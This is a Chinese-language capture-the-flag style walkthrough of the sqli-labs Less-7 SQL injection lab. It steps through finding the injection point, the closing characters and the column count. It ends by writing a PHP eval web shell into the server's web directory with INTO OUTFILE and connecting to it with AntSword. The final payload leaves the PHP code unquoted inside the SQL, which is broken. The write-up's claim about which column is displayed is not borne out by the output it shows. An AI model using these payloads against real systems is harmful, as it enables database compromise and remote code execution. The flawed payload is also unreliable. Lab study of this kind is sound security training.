进入靶机后可以看到信息：

> Please input the ID as parameter with numeric value

1.**判断是否存在SQL注入点**

输入`?id=1`可以看到回显信息：

> You are in.... Use outfile......

输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。

2.**判断闭合字符，注释后面的内容**

常见的闭合字符有四种：`'`，`"`，`')`，`'))`。

输入`?id=1'`可以看到信息：

> You have an error in your SQL syntax

说明闭合方式存在问题，但是回显信息只有一行。

`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。

然而，输入`?id=1'--+`依旧看到报错信息，说明`'`并不是该注入点的闭合字符。

输入`?id=1"`，显示信息：

> You are in.... Use outfile......

输入`?id=1')`可以看到回显信息：

> You have an error in your SQL syntax

输入`?id=1')--+`依旧看到报错信息，说明`')`并不是该注入点的闭合字符。

输入`?id=1'))`可以看到回显信息：

> You have an error in your SQL syntax

而输入`?id=1'))--+`可以看到正常回显信息You are in.... Use outfile......，说明该注入点的闭合字符是`'))`。

3.**使用`order by`排序语句判断有几列数据**

先随便写个数字来猜测有几行数据，输入`?id=1')) order by 6--+`看到以下信息，说明列数是小于6的。

> You have an error in your SQL syntax

再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显是You are in...........，说明列数为3。

4.**使用`union`联合查询语句判断显示位**

先使`union`前面的内容为假，比如`?id=-1')) union`，这样就只会显示`union`后面的内容查询结果。输入`?id=-1')) union select 1,2,3--+`看到回显结果是You are in...........，因此显示位是第3位。

5.**通过转储到输出文件进行sql注入**

这道题的小标题是**GET -Dump into outfile - String**。

先来介绍文件操作的函数：`load_file(file_name)`能读取文件并返回该文件的内容作为第一个字符串。使用条件：①必须有读取权限并且文件必须完全可读；②预读取文件必须在服务器上；③必须指定文件的完整路径；④预读取文件必须小于`max_allowed_packet`。

`SELECT ... INTO OUTFILE 'file_name'`可以将被选择的行写入到一个文件中，该文件被创建在服务器主机上，因此必须拥有文件权限才能使用此语法。也就是说我们可以通过`?id=-1')) union select 1,2,3 into outfile "/var/www/sqli-labs/Less7/test.txt" --+`写入数据。此处的第3位可以换成`PHP`的一句话木马`<?php @eval($_POST['shell']);?>`，即改成以下代码：

```sql
?id=-1')) union select 1,2,<?php @eval($_POST['shell']);?> into outfile "/var/www/sqli-labs/Less7/test.txt" --+
```

`PHP`一句话木马上传成功后，用`AntSword`连接靶机即可。

------
